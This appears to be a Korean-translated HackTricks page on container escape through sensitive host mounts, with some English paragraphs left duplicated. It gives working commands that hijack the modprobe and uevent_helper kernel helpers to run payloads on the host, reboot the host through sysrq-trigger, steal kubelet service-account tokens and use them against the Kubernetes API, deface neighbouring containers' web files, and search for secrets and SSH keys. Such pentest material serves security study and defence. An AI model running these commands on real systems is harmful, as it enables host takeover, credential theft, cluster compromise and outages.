# 민감한 호스트 마운트

{{#include ../../../banners/hacktricks-training.md}}

## 개요

Host mounts는 신중히 분리된 프로세스 뷰를 호스트 리소스의 직접 가시성으로 되돌리는 경우가 많기 때문에 실제적인 container-escape 표면 중 가장 중요하다. 위험한 경우는 `/`에만 국한되지 않는다. `/proc`, `/sys`, `/var`의 bind mounts, 런타임 소켓, kubelet-managed state, 또는 장치 관련 경로는 커널 제어, 자격증명, 인접 컨테이너의 파일시스템, 런타임 관리 인터페이스를 노출시킬 수 있다.

이 페이지는 남용 모델이 횡단적(cross-cutting)이기 때문에 개별 보호 페이지와 별도로 존재한다. 쓰기 가능한 호스트 마운트는 일부는 mount namespaces 때문에, 일부는 user namespaces 때문에, 일부는 AppArmor나 SELinux 적용 범위 때문에, 일부는 노출된 정확한 호스트 경로 때문에 위험하다. 이를 별도의 주제로 다루면 공격 표면을 이해하기가 훨씬 쉬워진다.

## `/proc` 노출

procfs는 일반적인 프로세스 정보와 높은 영향력을 가진 커널 제어 인터페이스를 모두 포함한다. `-v /proc:/host/proc`와 같은 bind mount나 예상치 못한 쓰기 가능한 proc 항목을 노출하는 컨테이너 뷰는 정보 노출, 서비스 거부, 또는 직접적인 호스트 코드 실행으로 이어질 수 있다.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 악용

어떤 high-value procfs 항목이 보이거나 쓰기 가능한지부터 확인한다:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

이 경로들은 각각 다른 이유로 주목할 만하다. `core_pattern`, `modprobe`, `binfmt_misc`는 쓰기 가능하면 host 코드 실행 경로가 될 수 있다. `kallsyms`, `kmsg`, `kcore`, `config.gz`는 kernel exploit을 위한 강력한 정찰 정보원이다. `sched_debug`와 `mountinfo`는 process, cgroup, filesystem 컨텍스트를 노출하여 container 내부에서 host 레이아웃을 재구성하는 데 도움이 된다.

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.

- `/proc/sys/kernel/core_pattern`
쓰기 가능하면, 커널이 crash 후에 파이프 핸들러를 실행하기 때문에 가장 영향력이 큰 procfs 경로 중 하나다. container가 `core_pattern`을 overlay에 저장한 페이로드나 마운트된 host 경로의 페이로드로 가리킬 수 있으면 종종 host 코드 실행을 얻을 수 있다. 예제는 [read-only-paths.md](protections/read-only-paths.md)를 참조하라.
- `/proc/sys/kernel/modprobe`
이 경로는 kernel이 module-loading 로직을 호출할 때 사용하는 userspace helper를 제어한다. container에서 쓰기 가능하고 host 컨텍스트에서 해석되면 또 다른 host 코드 실행 프리미티브가 될 수 있다. helper 경로를 트리거할 수 있는 방법과 결합되면 특히 흥미롭다.
- `/proc/sys/vm/panic_on_oom`
보통은 깔끔한 escape primitive는 아니지만, 메모리 압박을 OOM 상태에서 kernel panic 동작으로 바꿔 host 전체에 대한 서비스 거부(DoS)로 전환시킬 수 있다.
- `/proc/sys/fs/binfmt_misc`
등록 인터페이스가 쓰기 가능하면 공격자는 선택한 magic value에 대한 핸들러를 등록하고, 일치하는 파일이 실행될 때 host 컨텍스트에서 실행을 얻을 수 있다.
- `/proc/config.gz`
kernel exploit triage에 유용하다. host 패키지 메타데이터 없이도 어떤 서브시스템, 완화책(mitigations), 선택적 kernel 기능들이 활성화되어 있는지 판단하는 데 도움이 된다.
- `/proc/sysrq-trigger`
주로 denial-of-service 경로지만 매우 심각하다. 즉시 host를 재부팅하거나 panic을 유발하거나 기타 방식으로 중단시킬 수 있다.
- `/proc/kmsg`
kernel ring buffer 메시지를 노출한다. host fingerprinting, crash 분석에 유용하며, 일부 환경에서는 kernel exploitation에 도움이 되는 정보를 leak할 수 있다.
- `/proc/kallsyms`
읽을 수 있으면 가치가 크다. export된 kernel 심볼 정보를 노출하며 kernel exploit 개발 중 주소 난수화(address randomization) 가정을 무력화하는 데 도움될 수 있다.
- `/proc/[pid]/mem`
직접적인 process-memory 인터페이스다. 대상 프로세스가 필요한 ptrace-style 조건으로 접근 가능하면 다른 프로세스의 메모리를 읽거나 수정할 수 있다. 현실적 영향은 자격(credentials), `hidepid`, Yama, ptrace 제한에 크게 좌우되므로 강력하지만 조건부이다.
- `/proc/kcore`
시스템 메모리의 core-image 스타일 뷰를 노출한다. 파일은 매우 크고 다루기 불편하지만, 실질적으로 읽을 수 있다면 host 메모리 표면이 심하게 노출되어 있음을 나타낸다.
- `/proc/kmem` 및 `/proc/mem`
역사적으로 높은 영향력의 원시 메모리 인터페이스다. 많은 최신 시스템에서는 비활성화되거나 강하게 제한되어 있지만, 존재하고 사용 가능하면 심각한 소견으로 취급해야 한다.
- `/proc/sched_debug`
Leaks scheduling and task 정보로 인해, 다른 프로세스 뷰가 생각보다 깨끗해 보여도 host 프로세스 정체를 노출할 수 있다.
- `/proc/[pid]/mountinfo`
container가 host에서 실제로 어디에 위치하는지, 어떤 경로가 overlay-backed인지, 그리고 쓰기 가능한 마운트가 host 콘텐츠와 대응하는지 아니면 단지 container 레이어인지 재구성하는 데 매우 유용하다.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
만약 `/proc/[pid]/mountinfo` 또는 overlay 세부 정보가 읽을 수 있다면, 이를 사용해 container filesystem의 host 경로를 복구하라:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
이 명령들은 여러 호스트 실행 기법들이 컨테이너 내부의 경로를 호스트 관점에서의 대응 경로로 변환해야 하기 때문에 유용합니다.

### 전체 예제: `modprobe` 헬퍼 경로 악용

컨테이너에서 `/proc/sys/kernel/modprobe`가 쓰기 가능하고 헬퍼 경로가 호스트 컨텍스트에서 해석된다면, 이를 공격자가 제어하는 페이로드로 리디렉션할 수 있습니다:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
정확한 트리거는 대상과 커널 동작에 따라 달라지지만, 중요한 점은 쓰기 가능한 helper 경로가 향후 커널 helper 호출을 공격자가 제어하는 호스트 경로의 내용으로 리디렉션할 수 있다는 것이다.

### 전체 예시: Kernel Recon (`kallsyms`, `kmsg`, `config.gz` 사용)

목표가 즉각적인 탈출보다 익스플로잇 가능성 평가라면:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
이 명령들은 유용한 심볼 정보가 보이는지, 최근 커널 메시지가 흥미로운 상태를 드러내는지, 그리고 어떤 커널 기능이나 완화책이 컴파일되어 포함되어 있는지를 확인하는 데 도움이 됩니다. 영향은 보통 직접적인 탈출을 의미하지 않지만, 커널 취약점 분류를 크게 단축시킬 수 있습니다.

### 전체 예시: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
영향은 즉시 호스트 재부팅을 초래합니다. 이 예시는 미묘하지 않지만, procfs 노출이 단순한 정보 노출보다 훨씬 더 심각할 수 있음을 명확히 보여줍니다.

## `/sys` 노출

sysfs는 대량의 커널 및 디바이스 상태를 노출합니다. 일부 sysfs 경로는 주로 fingerprinting에 유용한 반면, 다른 경로는 helper 실행, 디바이스 동작, security-module 구성 또는 펌웨어 상태에 영향을 줄 수 있습니다.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이 경로들은 각기 다른 이유로 중요합니다. `/sys/class/thermal`은 thermal-management 동작에 영향을 미쳐 노출이 심한 환경에서 호스트 안정성에 영향을 줄 수 있습니다. `/sys/kernel/vmcoreinfo`는 crash-dump 및 kernel-layout 정보를 leak할 수 있어 저수준의 호스트 fingerprinting에 도움이 됩니다. `/sys/kernel/security`는 Linux Security Modules에서 사용하는 `securityfs` 인터페이스이므로, 예상치 못한 접근은 MAC-related 상태를 노출하거나 변경할 수 있습니다. EFI 변수 경로는 펌웨어에 의해 유지되는 부트 설정에 영향을 줄 수 있어 일반 설정 파일보다 훨씬 더 심각합니다. `/sys/kernel/debug` 아래의 `debugfs`는 특히 위험한데, 의도적으로 개발자 지향 인터페이스로 설계되어 강화된 운영 환경용 커널 API보다 안전성 기대치가 훨씬 낮기 때문입니다.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
이 명령들이 흥미로운 점:

- `/sys/kernel/security`는 AppArmor, SELinux 또는 다른 LSM 표면이 호스트 전용으로 유지되어야 할 방식으로 노출되는지 여부를 드러낼 수 있습니다.
- `/sys/kernel/debug`는 이 그룹에서 종종 가장 우려스러운 발견입니다. `debugfs`가 마운트되어 읽기 또는 쓰기가 가능하면, 활성화된 디버그 노드에 따라 정확한 위험이 달라지는 광범위한 커널-대상 표면을 예상해야 합니다.
- EFI 변수 노출은 덜 흔하지만, 존재할 경우 일반 런타임 파일이 아니라 펌웨어 기반 설정을 건드리므로 영향이 큽니다.
- `/sys/class/thermal`은 주로 호스트 안정성과 하드웨어 상호작용과 관련되며, 깔끔한 쉘 스타일 탈출에는 큰 관련이 없습니다.
- `/sys/kernel/vmcoreinfo`는 주로 호스트 식별(host-fingerprinting) 및 크래시 분석용 소스로, 저수준 커널 상태를 이해하는 데 유용합니다.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
이 방법이 동작하는 이유는 helper 경로가 호스트의 관점에서 해석되기 때문이다. 한번 트리거되면 helper는 현재 컨테이너 내부가 아니라 호스트 컨텍스트에서 실행된다.

## `/var` 노출

호스트의 `/var`를 컨테이너에 마운트하는 것은 `/`를 마운트하는 것만큼 극적으로 보이지 않기 때문에 종종 과소평가된다. 실제로는 런타임 소켓, 컨테이너 스냅샷 디렉토리, kubelet이 관리하는 pod 볼륨, projected service-account tokens, 그리고 인접한 애플리케이션 파일시스템에 접근하기에 충분할 수 있다. 최신 노드에서는 `/var`가 가장 운영상 흥미로운 컨테이너 상태가 실제로 존재하는 경우가 많다.

### Kubernetes 예시

`hostPath: /var`가 설정된 pod는 종종 다른 pod들의 projected 토큰과 overlay 스냅샷 콘텐츠를 읽을 수 있다:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
이 명령들은 mount가 단순한 애플리케이션 데이터만 노출하는지, 아니면 영향력이 큰 cluster credentials를 노출하는지를 알려주기 때문에 유용합니다. 읽을 수 있는 service-account token은 local code execution을 즉시 Kubernetes API 접근으로 바꿀 수 있습니다.

토큰이 존재한다면, token discovery에서 멈추지 말고 그 토큰이 무엇에 접근할 수 있는지 검증하세요:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
여기서의 영향은 로컬 노드 접근보다 훨씬 클 수 있습니다. 광범위한 RBAC 권한을 가진 token은 마운트된 `/var`를 클러스터 전체 침해로 만들 수 있습니다.

### Docker 및 containerd 예시

Docker 호스트에서는 관련 데이터가 종종 `/var/lib/docker`에 위치하며, containerd 기반 Kubernetes 노드에서는 `/var/lib/containerd` 또는 snapshotter별 경로에 있을 수 있습니다:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
마운트된 `/var`가 다른 workload의 쓰기 가능한 snapshot 내용을 노출하면, 공격자는 현재 container 구성에 손대지 않고 애플리케이션 파일을 변경하거나 웹 콘텐츠를 심거나 시작 스크립트를 바꿀 수 있습니다.

쓰기 가능한 snapshot 콘텐츠가 발견되었을 때의 구체적인 악용 아이디어:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
이 명령들은 마운트된 `/var`가 초래할 수 있는 세 가지 주요 영향(application tampering, secret recovery, lateral movement into neighboring workloads)을 보여주므로 유용합니다.

## 런타임 소켓

민감한 호스트 마운트는 전체 디렉터리 대신 런타임 소켓을 포함하는 경우가 많습니다. 이들은 매우 중요하므로 여기서 명시적으로 반복할 가치가 있습니다:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
이들 소켓 중 하나가 마운트되면 전체 익스플로잇 흐름은 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)를 참조하세요.

간단한 첫 상호작용 패턴:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## 마운트 관련 CVEs

Host mounts also intersect with runtime vulnerabilities. Important recent examples include:

- `CVE-2024-21626`는 `runc`에서 발생했으며, leaked 디렉터리 파일 디스크립터가 작업 디렉터리를 호스트 파일시스템에 배치할 수 있습니다.
- `CVE-2024-23651` and `CVE-2024-23653`는 BuildKit에서, OverlayFS의 copy-up races로 인해 빌드 중 호스트 경로에 쓰기가 발생할 수 있습니다.
- `CVE-2024-1753`는 Buildah와 Podman 빌드 플로우에서, 빌드 중 조작된 bind mounts가 `/`를 읽기-쓰기로 노출시킬 수 있습니다.
- `CVE-2024-40635`는 containerd에서, 큰 `User` 값이 UID 0 동작으로 오버플로우할 수 있습니다.

이들 CVE가 여기에 중요한 이유는 마운트 처리 문제가 단지 운영자 설정만의 문제가 아님을 보여주기 때문입니다. 런타임 자체가 마운트 기반 탈출 조건을 유발할 수도 있습니다.

## 검사

가장 가치 있는 마운트 노출을 빠르게 찾으려면 다음 명령을 사용하세요:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- 호스트 루트, `/proc`, `/sys`, `/var`, 및 런타임 소켓은 모두 높은 우선순위의 발견사항입니다.
- 쓰기 가능한 `/proc`/`/sys` 항목은 종종 마운트가 안전한 컨테이너 뷰가 아니라 호스트 전체의 커널 제어를 노출하고 있음을 의미합니다.
- `/var`에 마운트된 경로는 파일시스템 검토뿐만 아니라 자격 증명 및 인접 워크로드 검토가 필요합니다.
{{#include ../../../banners/hacktricks-training.md}}
